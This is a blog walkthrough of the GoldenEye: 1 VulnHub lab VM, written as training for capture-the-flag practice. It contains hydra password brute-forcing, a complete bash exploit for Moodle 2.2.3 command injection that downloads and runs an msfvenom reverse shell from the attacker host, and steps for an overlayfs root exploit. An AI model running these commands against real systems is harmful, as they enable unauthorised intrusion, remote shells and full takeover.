---
layout: post
title: "GoldenEye: 1 Walkthrough"
subtitle: "Shaken, Not Stirred"
date: 2018-09-14 21:03:27 +0000
last_modified_at: 2018-12-09 08:17:00 +0000
category: Walkthrough
tags: [VulnHub, GoldenEye]
comments: true
image:
  feature: goldeneye-1-walkthrough.jpg
  credit: stevepb / Pixabay
  creditlink: https://pixabay.com/en/cocktail-martini-gin-drink-glass-995574/
---

This post documents the complete walkthrough of GoldenEye: 1, a boot2root [VM][1] created by [creosote][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

This VM is an OSCP-type vulnerable machine that's themed after the great James Bond film (and even better n64 game) GoldenEye. The goal is to get `root` and capture the secret GoldenEye codes—`flag.txt`.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT      STATE SERVICE  REASON         VERSION
25/tcp    open  smtp     syn-ack ttl 64 Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:22:34
| Not valid after:  2028-04-21T03:22:34
| MD5:   cd4a d178 f216 17fb 21a6 0a16 8f46 c8c6
|_SHA-1: fda3 fc7b 6601 4746 96aa 0f56 b126 1c29 36e8 442c
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http     syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/pop3 syn-ack ttl 64 Dovecot pop3d
|_pop3-capabilities: USER TOP SASL(PLAIN) RESP-CODES PIPELINING AUTH-RESP-CODE UIDL CAPA
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63
|_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     syn-ack ttl 64 Dovecot pop3d
|_pop3-capabilities: TOP SASL(PLAIN) PIPELINING USER STLS RESP-CODES AUTH-RESP-CODE UIDL CAPA
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63
|_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77
|_ssl-date: TLS randomness does not represent time
```

`nmap` finds one web-related port, `80/tcp`; and three email-related ports, `25/tcp`, `55006/tcp`, and `55007/tcp`. Let's start with the web one. Here's how it looks like.

![d00c297f.png](/assets/images/posts/goldeneye-1-walkthrough/d00c297f.png)

If you look at the HTML source, you'll notice a reference to `terminal.js`.

![9cf63b1a.png](/assets/images/posts/goldeneye-1-walkthrough/9cf63b1a.png)

Let's decode the password.

```
# for d in $(echo -n '&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;' | tr -d '&#' | tr ';' '\n'); do printf \\$(printf "%o" $d); done && echo
InvincibleHack3r
```

Now, let's go to `/sev-home/` with this credential (`boris:InvincibleHack3r`).

![3d615e4a.png](/assets/images/posts/goldeneye-1-walkthrough/3d615e4a.png)

Look at the HTML source of this page, scroll down to the bottom and you'll find an important information, albeit a poor attempt to hide it in HTML comment.

![8c5f804d.png](/assets/images/posts/goldeneye-1-walkthrough/8c5f804d.png)

Together with the information gathered so far, I guess we have to pop into their POP3 mail boxes to find the next clue.

### Popping POP3

When it comes to online password cracking, `hydra` is my go-to choice. I'll normally load up with "rockyou", but `hydra` advises us to go with smaller wordlists for POP3. This turns out to be good advice.

![3509532e.png](/assets/images/posts/goldeneye-1-walkthrough/3509532e.png)

```
# Hydra v8.6 run at 2018-09-13 13:06:16 on 192.168.30.129 pop3 (hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -s 55006 -o hydra.txt -e nsr -t 64 pop3s://192.168.30.129)
[55006][pop3] host: 192.168.30.129   login: boris   password: secret1!
[55006][pop3] host: 192.168.30.129   login: natalya   password: bird
```

`users.txt` contains two entries: `boris` and `natalya`.

Not too shabby. We can now log in to their respective mail boxes with the following credentials:

+ `boris:secret1!`
+ `natalya:bird`

But because their emails are behind SSL-enabled POP3, we have to use a non-`nc` utility to retrieve the emails. I'm using `openssl s_client -connect ip:port` for this task.

### Boris' Emails

![93885b27.png](/assets/images/posts/goldeneye-1-walkthrough/93885b27.png)

Boris has three emails.

***Email: 1***

![25c6678a.png](/assets/images/posts/goldeneye-1-walkthrough/25c6678a.png)

***Email: 2***

![b5676a78.png](/assets/images/posts/goldeneye-1-walkthrough/b5676a78.png)

***Email: 3***

![755f791c.png](/assets/images/posts/goldeneye-1-walkthrough/755f791c.png)

### Natalya's Emails

It's Natalya's turn.

![56ca10dc.png](/assets/images/posts/goldeneye-1-walkthrough/56ca10dc.png)

She has two emails.

***Email: 1***

![713baa29.png](/assets/images/posts/goldeneye-1-walkthrough/713baa29.png)

***Email: 2***

![5931cee8.png](/assets/images/posts/goldeneye-1-walkthrough/5931cee8.png)

Nice. We got `xenia`'s credential.

### Severnaya Station

Following the advice in the previous email, we can add `severnaya-station.com` into `/etc/hosts` like this.

```
echo -e "192.168.30.129\tsevernaya-station.com" >> /etc/hosts
```

Once that's done, go to `severnaya-station.com/gnocertdir` to access the training site.

![780f6946.png](/assets/images/posts/goldeneye-1-walkthrough/780f6946.png)

Before we move on, there's an `admin` user. Keep that in mind.

### Who is Dr. Doak?

Let's log in to the training site with `xenia`'s credential. Upon log in, there's a notification of a new message from Dr. Doak.

![3937e14b.png](/assets/images/posts/goldeneye-1-walkthrough/3937e14b.png)

The message from Dr. Doak is as follows.

![34de8584.png](/assets/images/posts/goldeneye-1-walkthrough/34de8584.png)

Dr. Doak is offering information. His email username is `doak`. Time to go back to crack his POP3 mail box.

```
# Hydra v8.6 run at 2018-09-13 18:51:42 on 192.168.30.129 pop3 (hydra -l doak -P /usr/share/wordlists/fasttrack.txt -e nsr -o hydra.txt -t 50 -s 55006 pop3s://192.168.30.129)
[55006][pop3] host: 192.168.30.129   login: doak   password: goat

```

![890593b2.png](/assets/images/posts/goldeneye-1-walkthrough/890593b2.png)

Dr. Doak has one email.

***Email: 1***

![a0ded760.png](/assets/images/posts/goldeneye-1-walkthrough/a0ded760.png)

What do you know? Dr. Doak is revealing his credential for the training site. Back to the training site!

After fumbling around the site, I noticed something's up with the private files section shown here.

![e5e5f4dd.png](/assets/images/posts/goldeneye-1-walkthrough/e5e5f4dd.png)

Let's peek into the file.

![4ea52528.png](/assets/images/posts/goldeneye-1-walkthrough/4ea52528.png)

I love juicy stuff!

![9fba38e8.png](/assets/images/posts/goldeneye-1-walkthrough/9fba38e8.png)

![d24c5057.png](/assets/images/posts/goldeneye-1-walkthrough/d24c5057.png)

I also don't know my tradecraft. But, if I had to guess, I would say that looks like `base64`. Let's decode it and see what it says.

![78b99b42.png](/assets/images/posts/goldeneye-1-walkthrough/78b99b42.png)

Hmm. I wonder what's this for? Could this be `admin`'s password to the training site? There's only one way to find out.

![50295814.png](/assets/images/posts/goldeneye-1-walkthrough/50295814.png)

It's the `admin`'s password alright.

### Moodle 2.2.3 Remote Command Execution

There's a Metasploit exploit for Moodle but I find it hard to use. Instead, I wrote my own `bash` script based on it. The main difference lies in the payload.

<div class="filename"><span>exploit.sh</span></div>

```bash
#!/bin/bash
USER=admin
PASS=xWinter1995x%21
RHOST=severnaya-station.com
LHOST=192.168.30.128
LPORT=1234
SETTING=admin/settings.php
SECTION="$SETTING?section=editorsettingstinymce"
URI=gnocertdir
RPC=lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php
JSON='{"id":"c0","method":"checkWords","params":["en",[""]]}'

# Check for reverse shell
if [ ! -e rev ]; then
  printf "[+] Generating reverse shell..."
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev &>/dev/null
  printf "done\n"
fi

# Set up listeners
printf "[+] Opening listeners..."
xterm -T "SimpleHTTPServer" -e "python -m SimpleHTTPServer 80" &
xterm -T "SHELL" -e "nc -lnvp $LPORT" &
printf "done\n"

# Get cookie
curl -c cookie1 -o /dev/null -s http://$RHOST/$URI/index.php

# Login
curl -c cookie2 -b cookie1 -o /dev/null -s \
     -d "username=$USER&password=$PASS" \
     http://$RHOST/$URI/login/index.php

# Get 'sess'
SESS=$(curl -b cookie2 -s \
            http://$RHOST/$URI/$SECTION \
       | grep -Eo -m1 '?sesskey=.*"' \
       | cut -d'"' -f1 \
       | cut -d'=' -f2)

function trigger() {
  # Update spellcheck
  curl -b cookie2 -o /dev/null -s \
       --data-urlencode "section=systempaths" \
       --data-urlencode "sesskey=$SESS" \
       --data-urlencode "return" \
       --data-urlencode "s__gdversion=2" \
       --data-urlencode "s__pathtodu=/usr/bin/du" \
       --data-urlencode "s__aspellpath=$CMD" \
       --data-urlencode "s__pathtodot" \
       http://$RHOST/$URI/$SETTING

  # Trigger spellcheck
  curl -b cookie2 -o /dev/null -s \
       -H "Content-Type: application/json" \
       -d "$JSON" \
       http://$RHOST/$URI/$RPC
}

printf "[+] Pulling rev...";  CMD="sh -c 'wget -O /tmp/rev $LHOST/rev'"; trigger; printf "done\n"
printf "[+] chmod +x rev..."; CMD="sh -c 'chmod +x /tmp/rev'"; trigger; printf "done\n"
printf "[+] Executing rev...look at the SHELL window";CMD="sh -c '/tmp/rev'"; trigger;

# Clean up
rm cookie* 2>/dev/null
```

The script will open two listeners in `xterm`: 1) Python SimpleHTTPServer and 2) `nc` listener. It'll then transfer a reverse shell generated with `msfvenom` using `wget`, make it executable with `chmod`, and finally run the reverse shell.

For the exploit to work, the spell engine must be set to PSpellShell.

![8d8064b3.png](/assets/images/posts/goldeneye-1-walkthrough/8d8064b3.png)

### Low-Privilege Shell

Let's give the script a shot.

![ea18a5b4.png](/assets/images/posts/goldeneye-1-walkthrough/ea18a5b4.png)

![59d6ecf7.png](/assets/images/posts/goldeneye-1-walkthrough/59d6ecf7.png)

Woohoo. I got shell.

### Privilege Escalation

First of all, I notice this is a pretty old Ubuntu running an old kernel.

![113ed701.png](/assets/images/posts/goldeneye-1-walkthrough/113ed701.png)

EDB-ID [37292](https://www.exploit-db.com/exploits/37292/) looks like a perfect fit for the job—with one small problem—the VM doesn't have the necessary build tools such as `gcc`.

Nonetheless, we can revise the code and build the exploits on our attacking machine and transfer them over with `wget`. Our Python SimpleHTTPServer is still running, remember?

Here's the plan.

_On the attacking machine, do the following:_

1. Remove the line starting with `#define LIB "#include..."`, clean it up, and save it as `ofs-lib.c`
2. Remove these lines:
   ```
   lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
   write(lib,LIB,strlen(LIB));
   close(lib);
   lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
   if(lib != 0) {
       fprintf(stderr,"couldn't create dynamic library\n");
       exit(-1);
   }
   write(fd,"/tmp/ofs-lib.so\n",16);
   ```
3. Save what's left as `ofs.c`.
4. Compile `ofs.c` and `ofs-lib.c` separately.

Compiling `ofs.c` is easy.

```
# gcc -o ofs ofs.c
```

Compiling `ofs-lib.c` is slightly more difficult.

```
# gcc -fPIC -shared -o ofs-lib.so ofs-lib.c -ldl -w
```

_On the remote shell, do the following:_

1. `$ wget -O /tmp/ofs 192.168.30.128/ofs`
2. `$ chmod +x /tmp/ofs`
3. `$ wget -O /tmp/ofs-lib.so 192.168.30.128/ofs-lib.so`
4. Run `/tmp/ofs` to create `/etc/ld.so.preload`. Hit Enter to ignore the password prompt.
4. `$ echo /tmp/ofs-lib.so > /etc/ld.so.preload`
5. `$ /tmp/ofs`

![5f78bd46.png](/assets/images/posts/goldeneye-1-walkthrough/5f78bd46.png)

### To the GoldenEye Access Codes

Time to get the flag!

![d71702c6.png](/assets/images/posts/goldeneye-1-walkthrough/d71702c6.png)

:thumbsup:

![038f636c.png](/assets/images/posts/goldeneye-1-walkthrough/038f636c.png)

:dancer:

### Afterthought

Although the creator of this VM said exploit development and/or buffer overflows aren't needed to get `root`, a good understanding of the exploits involved is, in my humble opinion, necessary. As much as I like Metasploit, I still prefer to write my own tools.

[1]: https://www.vulnhub.com/entry/goldeneye-1,240/
[2]: https://www.reddit.com/user/_creosote
[3]: https://www.vulnhub.com/
